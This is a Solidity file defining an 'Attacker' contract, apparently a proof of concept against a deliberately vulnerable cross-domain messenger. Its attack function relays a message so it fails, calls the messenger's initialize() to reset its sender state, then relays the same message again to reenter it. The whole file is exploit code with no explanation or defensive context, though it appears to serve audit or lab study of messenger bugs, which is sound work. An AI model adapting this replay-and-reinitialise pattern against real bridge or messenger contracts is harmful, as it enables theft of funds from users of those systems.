 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0;

import "./VulnerableCrossDomainMessenger.sol"; 
import "./ExploitableContract.sol";

contract Attacker { 
    CrossDomainMessenger public messenger;
     ExploitableContract public exploitable;

constructor(CrossDomainMessenger _messenger, ExploitableContract _exploitable) {
    messenger = _messenger;
    exploitable = _exploitable;
}

function attack(bytes memory data, bytes32 versionedHash) external {
    // Step 1: Cause an initial failure to mark the message as failed
    messenger.relayMessage(address(exploitable), data, 100000, versionedHash);

    // Step 2: Simulate an upgrade by resetting xDomainMsgSender
    messenger.initialize();

    // Step 3: Reenter the relayMessage call during retry
    messenger.relayMessage(address(exploitable), data, 100000, versionedHash);
}
}